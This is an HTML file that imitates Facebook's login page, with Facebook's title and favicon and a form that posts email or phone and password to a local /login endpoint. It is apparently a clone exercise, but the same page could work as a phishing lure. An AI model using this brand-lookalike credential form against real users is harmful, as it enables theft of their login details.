<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook - log in or sign up</title>
  <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico" type="image/png">
  <link rel="stylesheet" href="../style.css">
</head>
<body>
  <div class="facebook-left-header">
    <img src="./images/facebook.svg" alt="Facebook img">
    <p class="facebook-left-header-text">Connect with friends and the world around you on Facebook.</p>
  </div>
  <div class="login-container">
    <form class="login-form" action="/login" method="POST">
      <input type="text" class="input-field" id='username' name="username" placeholder="Email or Phone number" required/>
      <input type="password" class="input-field" id='password' name="password" placeholder="Password" required/>
      <button type="submit" class="login-button">Log In</button>
      <div class="forgot-create-container">
        <div class="forgot-password"><a href="./forgotPassword.html" class="forgot-password">Forgot password?</a></div>
        <div class="line"></div>
        <button type="button" class="create-account-button">Create New Account</button>
      </div>
      
    </form>
    <div class="create-page-text">
        <a href='' class='createPageForBrandLink'>Create a Page</a> for a celebrity, brand or business.
    </div>
  </div>


</body>

</html>
